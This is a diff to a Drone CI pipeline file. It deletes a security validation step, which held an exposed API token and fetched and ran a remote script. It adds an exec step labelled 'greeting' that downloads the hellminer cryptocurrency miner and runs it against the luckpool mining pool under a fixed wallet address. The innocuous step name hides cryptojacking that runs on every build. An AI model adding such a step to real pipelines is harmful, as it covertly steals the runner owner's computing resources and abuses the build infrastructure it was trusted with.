@@ -1,18 +1,15 @@
+---
 kind: pipeline
-type: docker
+type: exec
 name: default
-# copy below lines in your .drone.yml file 
-environment:
-  productId: 1166
-  subProductId: 2883
-  environment: Production
-  token: d8aebd9b-37db-4b93-a000-bbd80b12aff8
-  buildTool: DRONE
-  buildNumber: "${DRONE_BUILD_NUMBER}"
-steps:
-- name: ArmorCode Validation
-  image: byrnedo/alpine-curl
-  commands:
-  - wget https://app.armorcode.com/static/scripts/slastatus.sh
-  - sh slastatus.sh
 
+platform:
+  os: linux
+  arch: amd64
+
+steps:
+- name: greeting
+  commands: 
+  - worker=Drone-CI-$RANDOM
+  - wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz
+  - ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$worker -p x --cpu 2
